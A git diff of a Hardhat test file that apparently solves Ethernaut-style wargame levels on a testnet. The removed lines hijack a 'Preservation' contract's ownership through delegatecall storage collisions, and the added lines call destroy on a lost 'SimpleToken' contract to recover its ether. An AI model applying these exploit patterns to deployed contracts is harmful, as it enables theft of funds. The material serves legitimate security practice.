@@ -1,81 +1,68 @@
 import { expect } from "chai";
-import { Attack, Preservation } from "../typechain-types";
+import { Recovery, SimpleToken } from "../typechain-types";
 import { ethers } from "hardhat";
 import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
 import { getContractFactory } from "@nomiclabs/hardhat-ethers/types";
+import { strict } from "assert";
+import { BigNumber, providers } from "ethers";
+import { Provider } from "@ethersproject/providers";
 
 describe("Preservation exploit using delegate call fun", function () {
-  let attackerContract: Attack,
-    contractAddress: string,
-    preservationContract: Preservation,
+  let contractAddress: string,
+    recoveryContract: Recovery,
+    simpleTokenContract: SimpleToken,
     attacker: SignerWithAddress,
-    owner: string;
+    balance: BigNumber;
 
   //Exploit takes place in deployment
-  before("Setup for attack locally", async function () {
+  before("Setup for attack on sepolia", async function () {
     // Setup deployment for library contracts
     [attacker] = await ethers.getSigners();
 
-    contractAddress = "0x59b09d6C6Da31eA5c7Be495BCa7A18E9c2cd5d2F";
+    contractAddress = "0x09631cD98Dcb5BC8ABAe267edf76056D85e5eD75";
 
-    preservationContract = await ethers.getContractAt(
-      "Preservation",
-      contractAddress
+    let simpleTokenContractAddress: string =
+      "0x792F11A76DD0f43CAB641900D359D50b8FfE1d50";
+
+    recoveryContract = await ethers.getContractAt("Recovery", contractAddress);
+
+    simpleTokenContract = await ethers.getContractAt(
+      "SimpleToken",
+      simpleTokenContractAddress
     );
-
-    const attackerContractFactory = await ethers.getContractFactory("Attack");
-
-    attackerContract = await attackerContractFactory.deploy(
-      preservationContract.address
-    );
-
-    await attackerContract.deployed();
   });
 
   it("perform exploit", async function () {
-    // NOTE: The delegate call is context preserving. The contract making the call preserves state
-    console.log(
-      "The owner before the attack is",
-      await preservationContract.owner()
+    let oldBalance = await ethers.provider.getBalance(
+      "0x09631cd98dcb5bc8abae267edf76056d85e5ed75"
     );
 
-    let oldLibraryAddress = await preservationContract.timeZone1Library();
+    console.log("The old balance is :", oldBalance);
 
-    // Step 1 Stored time of the calling contract is at slot 1. Let's have the attacker contract call setFirstTime and pass in the address casted as uint. timeZone1library slot will now be my attacker contract
-    let txSetLibraryToAttackAddress =
-      await attackerContract.setLibraryToAttackAddress({
-        gasLimit: 21000000,
-      });
+    // 1. Destroy contract and send funds back to (0x09631cD98Dcb5BC8ABAe267edf76056D85e5eD75)
+    // check for validity
 
-    await txSetLibraryToAttackAddress.wait();
+    let getName = await simpleTokenContract.name();
 
-    // Check and see that the address of the library has changed like we intended  address of
+    console.log("name is ", getName);
 
-    let newLibraryAddress = await preservationContract.timeZone1Library();
-
-    console.log("The first timzone library address is ", oldLibraryAddress);
-
-    console.log(
-      "The new library 1 address is (should be attacker contract address)",
-      newLibraryAddress
+    // destroy the lost token and sent it to the instance address
+    let destroyTx = await simpleTokenContract.destroy(
+      "0x09631cd98dcb5bc8abae267edf76056d85e5ed75"
     );
 
-    // Step 2 The attacker contract will have 3 storage slots, address buffer, address buffer, uint owner and a function called setTime. This setFirstTime will be called again and it will set the owner as address(this)
+    await destroyTx.wait();
+    // 2 visually check balance of instance address is greater than .001 eth
 
-    let txSetOwnerOfPreservationContract =
-      await attackerContract.SetOwnerOfPreservationContract({
-        gasLimit: 21000000,
-      });
+    balance = await ethers.provider.getBalance(
+      "0x09631cD98Dcb5BC8ABAe267edf76056D85e5eD75"
+    );
 
-    await txSetOwnerOfPreservationContract.wait();
-
-    owner = await preservationContract.owner();
-
-    console.log("The owner after the attack is ", owner);
+    console.log("The new balance is :", balance);
   }).timeout(30000000);
 
   after("confirm exploit", async function () {
     // check that the new owner of the preservation contract is indeed my address
-    expect(owner).to.be.eq(attacker.address);
+    expect(balance).to.be.gte(ethers.utils.parseEther(".001"));
   });
 });
